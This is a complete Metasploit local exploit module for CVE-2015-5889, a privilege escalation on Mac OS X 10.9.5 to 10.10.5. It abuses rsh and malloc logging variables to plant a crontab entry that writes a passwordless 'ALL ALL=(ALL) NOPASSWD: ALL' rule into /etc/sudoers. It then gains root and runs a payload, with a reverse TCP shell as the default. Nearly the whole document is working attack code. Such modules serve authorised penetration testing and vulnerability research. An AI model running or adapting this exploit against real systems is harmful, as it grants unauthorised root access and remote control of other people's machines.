##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require 'msf/core'
 
class Metasploit4 < Msf::Exploit::Local
 
  Rank = NormalRanking
 
  include Msf::Post::OSX::System
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
 
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Mac OS X 10.9.5 / 10.10.5 - rsh/libmalloc Privilege Escalation',
      'Description'    => %q{
        This module writes to the sudoers file without root access by exploiting rsh and malloc log files.
        Makes sudo require no password, giving access to su even if root is disabled.
        Works on OS X 10.9.5 to 10.10.5 (patched on 10.11).
      },
      'Author'         => [
        'rebel',      # Vulnerability discovery and PoC
        'shandelman116'  # Copy/paste AND translator monkey
      ],
      'References'     => [
        ['EDB', '38371'],
        ['CVE', '2015-5889']
      ],
      'DisclosureDate' => 'Oct 1 2015',
      'License'        => MSF_LICENSE,
      # Want to ensure that this can be used on Python Meterpreter sessions as well
      'Platform'       => ['osx', 'python'],
      'Arch'           => [ARCH_X86_64, ARCH_PYTHON],
      'SessionTypes'   => ['shell', 'meterpreter'],
      'Privileged'     => true,
      'Targets'        => [
        ['Mac OS X 10.9.5-10.10.5', {}]
      ],
      'DefaultTarget'  => 0,
      'DefaultOptions' => {
        'PAYLOAD'         => 'osx/x64/shell_reverse_tcp'
      }
    ))
 
    register_options(
      [
        OptInt.new('WaitTime', [true, 'Seconds to wait for exploit to work', 60]),
        OptString.new('WritableDir', [true, 'Writable directory', '/.Trashes'])
      ], self.class
    )
  end
 
  def exploit
    # Check OS
    os_check
 
    # Check if crontab file existed already so it can be restored at cleanup
    if file_exist? "/etc/crontab"
      @crontab_original = read_file("/etc/crontab")
    else
      @crontab_original = nil
    end
 
    # Writing payload
    if payload.arch.include? ARCH_X86_64
      vprint_status("Writing payload to #{payload_file}.")
      write_file(payload_file, payload_source)
      vprint_status("Finished writing payload file.")
      register_file_for_cleanup(payload_file)
    elsif payload.arch.include? ARCH_PYTHON
      vprint_status("No need to write payload. Will simply execute after exploit")
      vprint_status("Payload encodeded is #{payload.encoded}")
    end
 
    # Run exploit
    sploit
 
    # Execute payload
    print_status('Executing payload...')
    if payload.arch.include? ARCH_X86_64
      cmd_exec("chmod +x #{payload_file}; #{payload_file} & disown")
    elsif payload.arch.include? ARCH_PYTHON
      cmd_exec("python -c \"#{payload.encoded}\" & disown")
    end
    vprint_status("Finished executing payload.")
  end
 
  def os_check
    # Get sysinfo
    sysinfo = get_sysinfo
    # Make sure its OS X (Darwin)
    unless sysinfo["Kernel"].include? "Darwin"
      print_warning("The target system does not appear to be running OS X!")
      print_warning("Kernel information: #{sysinfo['Kernel']}")
      return
    end
    # Make sure its not greater than 10.5 or less than 9.5
    version = sysinfo["ProductVersion"]
    minor_version = version[3...version.length].to_f
    unless minor_version >= 9.5 && minor_version <= 10.5
      print_warning("The target version of OS X does not appear to be compatible with the exploit!")
      print_warning("Target is running OS X #{sysinfo['ProductVersion']}")
    end
  end
 
  def sploit
    user = cmd_exec("whoami").chomp
    vprint_status("The current effective user is #{user}. Starting the sploit")
    # Get size of sudoers file
    sudoer_path = "/etc/sudoers"
    size = get_stat_size(sudoer_path)
 
    # Set up the environment and command for spawning rsh and writing to crontab file
    rb_script = "e={\"MallocLogFile\"=>\"/etc/crontab\",\"MallocStackLogging\"=>\"yes\",\"MallocStackLoggingDirectory\"=>\"a\n* * * * * root echo \\\"ALL ALL=(ALL) NOPASSWD: ALL\\\" >> /etc/sudoers\n\n\n\n\n\"}; Process.spawn(e,[\"/usr/bin/rsh\",\"rsh\"],\"localhost\",[:out, :err]=>\"/dev/null\")"
    rb_cmd = "ruby -e '#{rb_script}'"
 
    # Attempt to execute
    print_status("Attempting to write /etc/crontab...")
    cmd_exec(rb_cmd)
    vprint_status("Now to check whether the script worked...")
 
    # Check whether it worked
    crontab = cmd_exec("cat /etc/crontab")
    vprint_status("Reading crontab yielded the following response: #{crontab}")
    unless crontab.include? "ALL ALL=(ALL) NOPASSWD: ALL"
      vprint_error("Bad news... it did not write to the file.")
      fail_with(Failure::NotVulnerable, "Could not successfully write to crontab file.")
    end
 
    print_good("Succesfully wrote to crontab file!")
 
    # Wait for sudoers to change
    new_size = get_stat_size(sudoer_path)
    print_status("Waiting for sudoers file to change...")
 
    # Start timeout block
    begin
      Timeout.timeout(datastore['WaitTime']) {
        while new_size <= size
          Rex.sleep(1)
          new_size = get_stat_size(sudoer_path)
        end
      }
    rescue Timeout::Error
      fail_with(Failure::TimeoutExpired, "Sudoers file size has still not changed after waiting the maximum amount of time. Try increasing WaitTime.")
    end
    print_good("Sudoers file has changed!")
 
    # Confirming root access
    print_status("Attempting to start root shell...")
    cmd_exec("sudo -s su")
    user = cmd_exec("whoami")
    unless user.include? "root"
      fail_with(Failure::UnexpectedReply, "Unable to acquire root access. Whoami returned: #{user}")
    end
    print_good("Success! Acquired root access!")
  end
 
  def get_stat_size(file_path)
    cmd = "env -i [$(stat -s #{file_path})] bash -c 'echo $st_size'"
    response = cmd_exec(cmd)
    vprint_status("Response to stat size query is #{response}")
    begin
      size = Integer(response)
      return size
    rescue ArgumentError
      fail_with(Failure::UnexpectedReply, "Could not get stat size!")
    end
  end
 
  def payload_source
    if payload.arch.include? ARCH_X86_64
      return Msf::Util::EXE.to_osx_x64_macho(framework, payload.encoded)
    elsif payload.arch.include? ARCH_PYTHON
      return payload.encoded
    end
  end
 
  def payload_file
    @payload_file ||=
      "#{datastore['WritableDir']}/#{Rex::Text.rand_text_alpha(8)}"
  end
 
  def cleanup
    vprint_status("Starting the cron restore process...")
    super
    # Restore crontab back to is original state
    # If we don't do this, then cron will continue to append the no password rule to sudoers.
    if @crontab_original.nil?
      # Erase crontab file and kill cron process since it did not exist before
      vprint_status("Killing cron process and removing crontab file since it did not exist prior to exploit.")
      rm_ret = cmd_exec("rm /etc/crontab 2>/dev/null; echo $?")
      if rm_ret.chomp.to_i == 0
        vprint_good("Successfully removed crontab file!")
      else
        print_warning("Could not remove crontab file.")
      end
      Rex.sleep(1)
      kill_ret = cmd_exec("killall cron 2>/dev/null; echo $?")
      if kill_ret.chomp.to_i == 0
        vprint_good("Succesfully killed cron!")
      else
        print_warning("Could not kill cron process.")
      end
    else
      # Write back the original content of crontab
      vprint_status("Restoring crontab file back to original contents. No need for it anymore.")
      cmd_exec("echo '#{@crontab_original}' > /etc/crontab")
    end
    vprint_status("Finished the cleanup process.")
  end
end
